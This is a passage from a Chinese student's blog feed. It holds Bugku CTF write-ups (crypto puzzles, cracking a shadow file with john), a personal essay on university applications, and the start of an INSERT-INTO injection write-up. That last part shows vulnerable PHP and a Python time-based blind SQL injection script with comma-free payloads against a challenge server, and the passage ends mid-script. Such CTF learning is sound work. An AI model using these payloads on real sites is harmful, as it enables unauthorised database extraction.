class="number">145</span>, <span class="number">12</span>, <span class="number">169</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">161</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">110</span>, <span class="number">191</span>, <span class="number">43</span>, <span class="number">82</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">102</span>, <span class="number">166</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">5</span>, <span class="number">189</span>, <span class="number">27</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(o)</span>:</span></span><br><span class="line">    k = permutate(s_box,o)</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(k),<span class="number">7</span>):</span><br><span class="line">        b.append(k[i:i+<span class="number">7</span>]+[<span class="number">1</span>])</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> b[i]:</span><br><span class="line">            x += (j&lt;&lt;pos)</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">        c.append((<span class="number">0x10001</span>**x) % (<span class="number">0x7f</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(key) != <span class="number">24</span> <span class="keyword">or</span> isinstance(key,bytes) == <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"key must be 24 bytes long"</span>)</span><br><span class="line">        self.key = key</span><br><span class="line">        self.gen_subkey()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = string_to_bits(self.key)</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            o = generate(o)</span><br><span class="line">            k.extend(o)</span><br><span class="line">            o = string_to_bits([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> o[<span class="number">0</span>:<span class="number">24</span>]])</span><br><span class="line">        self.Kn = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            self.Kn.append(map(chr,k[i*<span class="number">8</span>: i*<span class="number">8</span>+<span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,plaintext)</span>:</span></span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext)/<span class="number">16</span>):</span><br><span class="line">            block = plaintext[i*<span class="number">16</span>:(i + <span class="number">1</span>)*<span class="number">16</span>]  </span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                L,R = R, (round_add(L, self.Kn[<span class="number">31</span>-round_cnt]))</span><br><span class="line">            L,R = R,L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">nles = N1ES(key)</span><br><span class="line">flag = base64.b64decode(<span class="string">"HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx"</span>)</span><br><span class="line">flag = nles.decrypt(flag)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>参考大佬博客：<a href="https://www.cnblogs.com/0yst3r-2046/p/12123653.html" target="_blank" rel="noopener">https://www.cnblogs.com/0yst3r-2046/p/12123653.html</a></p><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><blockquote><p>二进制、八进制、十进制、十六进制，你能分的清吗？<br>来源：第七届大学生网络安全技能大赛<br>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</p></blockquote><p>这串字符有b二进制、o八进制、d十进制、x十六进制，先上脚本全部转化为十六进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="string">"d87"</span>, <span class="string">"x65"</span>, <span class="string">"x6c"</span>, <span class="string">"x63"</span>, <span class="string">"o157"</span>, <span class="string">"d109"</span>, <span class="string">"o145"</span>, <span class="string">"b100000"</span>, <span class="string">"d116"</span>, <span class="string">"b1101111"</span>, <span class="string">"o40"</span>, <span class="string">"x6b"</span>, <span class="string">"b1100101"</span>,</span><br><span class="line">     <span class="string">"b1101100"</span>, <span class="string">"o141"</span>, <span class="string">"d105"</span>, <span class="string">"x62"</span>, <span class="string">"d101"</span>, <span class="string">"b1101001"</span>, <span class="string">"d46"</span>, <span class="string">"o40"</span>, <span class="string">"d71"</span>, <span class="string">"x69"</span>, <span class="string">"d118"</span>, <span class="string">"x65"</span>, <span class="string">"x20"</span>,</span><br><span class="line">     <span class="string">"b1111001"</span>, <span class="string">"o157"</span>, <span class="string">"b1110101"</span>, <span class="string">"d32"</span>, <span class="string">"o141"</span>, <span class="string">"d32"</span>, <span class="string">"d102"</span>, <span class="string">"o154"</span>, <span class="string">"x61"</span>, <span class="string">"x67"</span>, <span class="string">"b100000"</span>, <span class="string">"o141"</span>, <span class="string">"d115"</span>,</span><br><span class="line">     <span class="string">"b100000"</span>, <span class="string">"b1100001"</span>, <span class="string">"d32"</span>, <span class="string">"x67"</span>, <span class="string">"o151"</span>, <span class="string">"x66"</span>, <span class="string">"d116"</span>, <span class="string">"b101110"</span>, <span class="string">"b100000"</span>, <span class="string">"d32"</span>, <span class="string">"d102"</span>, <span class="string">"d108"</span>, <span class="string">"d97"</span>,</span><br><span class="line">     <span class="string">"o147"</span>, <span class="string">"d123"</span>, <span class="string">"x31"</span>, <span class="string">"b1100101"</span>, <span class="string">"b110100"</span>, <span class="string">"d98"</span>, <span class="string">"d102"</span>, <span class="string">"b111000"</span>, <span class="string">"d49"</span>, <span class="string">"b1100001"</span>, <span class="string">"d54"</span>, <span class="string">"b110011"</span>, <span class="string">"x39"</span>,</span><br><span class="line">     <span class="string">"o64"</span>, <span class="string">"o144"</span>, <span class="string">"o145"</span>, <span class="string">"d53"</span>, <span class="string">"x61"</span>, <span class="string">"b1100010"</span>, <span class="string">"b1100011"</span>, <span class="string">"o60"</span>, <span class="string">"d48"</span>, <span class="string">"o65"</span>, <span class="string">"b1100001"</span>, <span class="string">"x63"</span>, <span class="string">"b110110"</span>,</span><br><span class="line">     <span class="string">"d101"</span>, <span class="string">"o63"</span>, <span class="string">"b111001"</span>, <span class="string">"d97"</span>, <span class="string">"d51"</span>, <span class="string">"o70"</span>, <span class="string">"d55"</span>, <span class="string">"b1100010"</span>, <span class="string">"d125"</span>, <span class="string">"x20"</span>, <span class="string">"b101110"</span>, <span class="string">"x20"</span>, <span class="string">"b1001000"</span>,</span><br><span class="line">     <span class="string">"d97"</span>, <span class="string">"d118"</span>, <span class="string">"o145"</span>, <span class="string">"x20"</span>, <span class="string">"d97"</span>, <span class="string">"o40"</span>, <span class="string">"d103"</span>, <span class="string">"d111"</span>, <span class="string">"d111"</span>, <span class="string">"x64"</span>, <span class="string">"d32"</span>, <span class="string">"o164"</span>, <span class="string">"b1101001"</span>, <span class="string">"x6d"</span>,</span><br><span class="line">     <span class="string">"o145"</span>, <span class="string">"x7e"</span>]</span><br><span class="line">s1 = <span class="string">""</span></span><br><span class="line">t = <span class="string">""</span></span><br><span class="line">t1 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s1 = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> s1[<span class="number">0</span>:<span class="number">1</span>] == <span class="string">'d'</span>:</span><br><span class="line">            t = str(hex(int(s1[<span class="number">1</span>:])))</span><br><span class="line">            t = t[<span class="number">2</span>:] + <span class="string">" "</span></span><br><span class="line">            t1 = t1 + t</span><br><span class="line">        <span class="keyword">if</span> s1[<span class="number">0</span>:<span class="number">1</span>] == <span class="string">'x'</span>:</span><br><span class="line">            t = s1[<span class="number">1</span>:] + <span class="string">" "</span></span><br><span class="line">            t1 = t1 + t</span><br><span class="line">        <span class="keyword">if</span> s1[<span class="number">0</span>:<span class="number">1</span>] == <span class="string">'o'</span>:</span><br><span class="line">            t = str(hex(int(s1[<span class="number">1</span>:], <span class="number">8</span>)))</span><br><span class="line">            t = t[<span class="number">2</span>:] + <span class="string">" "</span></span><br><span class="line">            t1 = t1 + t</span><br><span class="line">        <span class="keyword">if</span> s1[<span class="number">0</span>:<span class="number">1</span>] == <span class="string">'b'</span>:</span><br><span class="line">            t = str(hex(int(s1[<span class="number">1</span>:], <span class="number">2</span>)))</span><br><span class="line">            t = t[<span class="number">2</span>:] + <span class="string">" "</span></span><br><span class="line">            t1 = t1 + t</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br></pre></td></tr></table></figure><p>得到一串16进制数，然后转字符，<a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">https://www.bejson.com/convert/ox2str/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">57</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">63</span> <span class="number">6</span>f <span class="number">6</span>d <span class="number">65</span> <span class="number">20</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">20</span> <span class="number">6</span>b <span class="number">65</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">69</span> <span class="number">62</span> <span class="number">65</span> <span class="number">69</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">47</span> <span class="number">69</span> <span class="number">76</span> <span class="number">65</span> <span class="number">20</span> <span class="number">79</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">20</span> <span class="number">61</span> <span class="number">20</span> <span class="number">66</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">67</span> <span class="number">20</span> <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">61</span> <span class="number">20</span> <span class="number">67</span> <span class="number">69</span> <span class="number">66</span> <span class="number">74</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">20</span> <span class="number">66</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">67</span> <span class="number">7</span>b <span class="number">31</span> <span class="number">65</span> <span class="number">34</span> <span class="number">62</span> <span class="number">66</span> <span class="number">38</span> <span class="number">31</span> <span class="number">61</span> <span class="number">36</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">64</span> <span class="number">65</span> <span class="number">35</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">30</span> <span class="number">30</span> <span class="number">35</span> <span class="number">61</span> <span class="number">63</span> <span class="number">36</span> <span class="number">65</span> <span class="number">33</span> <span class="number">39</span> <span class="number">61</span> <span class="number">33</span> <span class="number">38</span> <span class="number">37</span> <span class="number">62</span> <span class="number">7</span>d <span class="number">20</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">48</span> <span class="number">61</span> <span class="number">76</span> <span class="number">65</span> <span class="number">20</span> <span class="number">61</span> <span class="number">20</span> <span class="number">67</span> <span class="number">6</span>f <span class="number">6</span>f <span class="number">64</span> <span class="number">20</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">7</span>e</span><br></pre></td></tr></table></figure><p>得到flag{1e4bf81a6394de5abc005ac6e39a387b}</p><h1 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h1><blockquote><p>y = 17x-8 flag{szzyfimhyzd}<br>答案格式：flag{*}<br>来源：第七届山东省大学生网络安全技能大赛</p></blockquote><p>affine是仿射的意思，想到可能是仿射加密，y = 17x-8为加密函数，仿射加密知识参考<a href="https://blog.csdn.net/zz_Caleb/article/details/84184283" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/84184283</a><br>按照26个英文字母及其顺序进行解密。<br>下面是解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">newlist = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    newlist += list[(<span class="number">17</span> * i - <span class="number">8</span>) % <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">y = <span class="string">'szzyfimhyzd'</span></span><br><span class="line">x = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> y:</span><br><span class="line">    x += list[newlist.find(j)]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'flag&#123;'</span> + x + <span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure><p>得到flag{affineshift}</p><h1 id="Crack-it"><a href="#Crack-it" class="headerlink" title="Crack it"></a>Crack it</h1><blockquote><p>破解该文件，获得密码，flag格式为：flag{*}<br>来源：第七届山东省大学生网络安全技能大赛</p></blockquote><p>下载下来是shadow文件，放到kali里面查看一下，<br><img src="https://img-blog.csdnimg.cn/20200226221932294.png" alt="在这里插入图片描述"><br>这是linux shadow文件，shadow文件是存放root密码的，具体介绍看<a href="https://blog.csdn.net/qq_34556414/article/details/81275429" target="_blank" rel="noopener">这篇博客</a>，用kali里面的john工具爆破，<br><img src="https://img-blog.csdnimg.cn/20200226221850615.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200226222140474.png" alt="在这里插入图片描述"><br>得到flag:hellokitty</p><h1 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h1><blockquote><p>银河战队出击<br>flag格式 flag{字母小写}</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200226222251527.png" alt="在这里插入图片描述"><br>这是一种标注银河字母，<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%93%B6%E6%B2%B3%E5%AD%97%E6%AF%8D/2691355?fr=aladdin" target="_blank" rel="noopener">百度百科介绍</a><br><img src="https://img-blog.csdnimg.cn/20200226222417361.png" alt="在这里插入图片描述"><br>对比得到flag{nopqrst}</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;前言：太久没刷题了，今天心血来潮一口气刷完了Bugku的加密（感觉拖了好久，拖延症晚期），下为wp。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>高考志愿填报の思考</title>
    <link href="http://yoursite.com/2020/02/13/%E9%AB%98%E8%80%83%E5%BF%97%E6%84%BF%E5%A1%AB%E6%8A%A5%E3%81%AE%E6%80%9D%E8%80%83/"/>
    <id>http://yoursite.com/2020/02/13/%E9%AB%98%E8%80%83%E5%BF%97%E6%84%BF%E5%A1%AB%E6%8A%A5%E3%81%AE%E6%80%9D%E8%80%83/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-02-13T09:44:32.694Z</updated>
    
    <content type="html"><![CDATA[<p>这几天，总感觉心里毛毛躁躁，不太想学习，什么也不想干了（颓废状态orz）<br><img src="https://img-blog.csdnimg.cn/20200213163056860.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" width="250" height="250"></p><a id="more"></a><p>作为一名“好学生”，怎么能放任自己这样下去呢！然后就想办法激励自己去学习，不经意就神游天外了。。。<br>不知怎么就想起了自己高考志愿填报的事。安徽省18届考生，依稀记得省排名14000+（貌似是14469，记不清了，记性不好QAQ）志愿填报的图找不到了，就不po出来了。但是志愿还依稀记得，第一，合工大，第二，西南大学，第三，南昌大学，第四，郑州大学，第五，安徽大学。基本上报的都是电子或计算机相关专业，因为当时高中总听数学老师说，学计算机的有多nb什么的，自己也有点偏向这个方向，就报了（家里人部分想让我学医，然鹅我不想，有点倔强(●’◡’●)）第一志愿，当时是抱着可以冲一冲的心态报的，毕竟是安徽省第二的高校（第一没得希望），当时家人劝我上安大，但我个人比较偏执，对安大不知怎么就是不太愿意上（我知道我的分数肯定绰绰有余，想上个更好的211）最后被南大信安专业录取了。通知书刚下来，不算满意，毕竟没被合工大录取，不过想想合工大王牌专业是车辆工程，我还是算了吧（不算了又能怎样呢），自我安慰。。。<br>进入学校之后，感觉还可以，同学比较友好，老师也还好（没怎么研究过师资力量，保研方面的，只感觉应该还不错吧），只是我们学院是老校区，比较破旧，还是和附中在一起的，每天还要和“小学生”抢饭吃，难受.jpg。不过还好是在南昌市中心，交通便利，出校门就有超市等，比较方便，而且学院小，上课不用走太多路hhh<br>大一进了学院的技协ctf部门，认识了许多大佬，而且非常感谢肖师傅对我的引导和帮助，我也渐渐对安全产生了兴趣，并决定要好好学。奈何自己比较懒，浅尝辄止，参加了几次ctf比赛，几乎没有什么成绩，现在大二了还没学到什么东西tcl  慢慢地我发现我们学校的信安专业并不是很好，网上看到竟然还不如安大的信安专业，有点后悔当初的选择了555，（更后悔高三整天想睡觉，不好好学习）不过近两年排名有所上升，毕竟国家重视嘛！<br>不过想一想，还是自己的锅，只能怪自己大学前没有想好自己以后要做什么，（之前和学姐聊天的时候，学姐就看破了我的经历），从小到大，一直都是大人眼中的乖乖女，老师眼中的好学生，就一直学习书本知识，好像没有明确过自己以后要做的事，浑浑噩噩过了十几年。。。走到今天这一步，都是自己做出的选择，也怪不得谁。时光不能倒流，高考已成往事，再后悔已经无用了，还是好好考虑一下当下和以后的路吧！既然本科没考好，不如研究生努力考好一点，一不做二不休就考中科大吧，我们省第一大高校(ง •_•)ง（PS：说不定以后会变，先写着吧，学姐跨专业考研清华网络空间安全，想向她学习，而且北京机会多，emm又怕自己太菜了QAQ）从现在开始，好好学安全技术，还记得有大佬和我说过，学校不出名，那就让自己出名，现在想想这句话很有道理。<br>再回到志愿填报上。无聊查了一下当年高考投档线，如下图，<br><img src="https://img-blog.csdnimg.cn/20200213171604653.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200213171629476.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看投档最低分排名，很明显，合工大12687，西南13177，上不了，南大14744，录取了。当年的志愿没有请教过老师，觉得考差了，不好意思，都是我自己决定填报的。这么看来，志愿填的还行吧，不算太烂，继续求心理安慰。。。<br>总结一下，高中真的要好好学习，高考很重要，是人生中一大转折点，你18年的努力有没有白费就体现在你的高考成绩上了，以前的成绩再光辉都没用。今年表妹就要高考了，希望她能不负众望，考上理想的985大学，一定要考得比我好！wtcl 而且我觉得志愿填报首先要看自己的意愿，想报什么专业，其次就是考虑省排名，对应可以报考的高校，再最后结合城市，学校条件进行选择（城市蛮重要的orz毕竟大城市机会多）<br>最后，人间值得，未来可期！(ง •_•)ง</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这几天，总感觉心里毛毛躁躁，不太想学习，什么也不想干了（颓废状态orz）&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200213163056860.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70&quot; width=&quot;250&quot; height=&quot;250&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Bugku INSERT-INTO注入</title>
    <link href="http://yoursite.com/2020/02/03/Bugku%20INSERT-INTO%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/03/Bugku%20INSERT-INTO%E6%B3%A8%E5%85%A5/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:07:10.780Z</updated>
    
    <content type="html"><![CDATA[<p>刷题~~</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>题目给了源码，简单分析下知道是读取HTTP头部的X_FORWARDED_FOR作为ip，在将其传给$ip前，用explode()函数以,为分割符分割并取结果数组的第一项。</p><p>要进行注入的语句是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (<span class="string">'$ip'</span>)</span><br></pre></td></tr></table></figure><p>很明显，这是一道过滤了逗号的xff注入题目，由于返回结果无有效回显，可以进行时间盲注。<br>后面的就不会了55555</p><p>下面是大佬的wp:</p><p>我看到网络上有些writeup在猜解flag时直接得知了它在flag表的flag列，也许是一种巧妙的猜测？猜不到就只能通过information_schema数据库慢慢猜解表和列了。</p><p>一些知识点：</p><ol><li>元数据在sql注入中的应用，即informations_schema库中的SCHEMATA、TABLES、COLUMNS表中存储着数据库系统中数据库、表、列的信息。</li><li>MySQL中的case when语句。进行时间盲注时自然想到的是if(cond,expr1,expr2)语句，但是此处对逗号进行了过滤，因此采用case when 代替if进行时间盲注。</li><li>substr截取字符串的非逗号形式。进行时间盲注要穷举字符，需要通过substr截取字符串，但是常用的形式substr([str],[from],[len])含有逗号，因此采用substr([str] from [from] for [len])来代替，比如substr(‘asd’,1,2)与substr(‘asd’ from 1 for 2)都获得’as’。</li><li>limit的非逗号形式。有时一条语句可以查询出多个结果，进行一一猜解时要每次限制查询出一条结果，在不使用逗号时，用limit [len] offset [offset] 代替 limit [offset],[len]。</li></ol><p>下面是猜解代码，可以通过改写为多线程/进程提高网络io速度，可以通过提高sleep及timeout时间提高准确度。<br>猜解库和表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"><span class="comment">#猜解数据库名称的payload</span></span><br><span class="line">payload_db = <span class="string">"1'+(select case when (substr(database() from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表数量的payload</span></span><br><span class="line">payload_tb_num = <span class="string">"1'+(select case when (select count(*) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;')='&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表名字长度的payload，注：其实也可不猜解长度，直接猜解具体字符，当发现名称字符串不变时(即不再捕获到ReadTimeout异常添加字符时)说明猜解完成</span></span><br><span class="line">payload_tb_name_len = <span class="string">"1'+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) = '&#123;2&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表名字的payload</span></span><br><span class="line">payload_tb_name = <span class="string">"1'+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) from &#123;2&#125; for 1)) = '&#123;3&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web15/'</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">''</span> </span><br><span class="line"><span class="comment">#数据库名破解</span></span><br><span class="line"><span 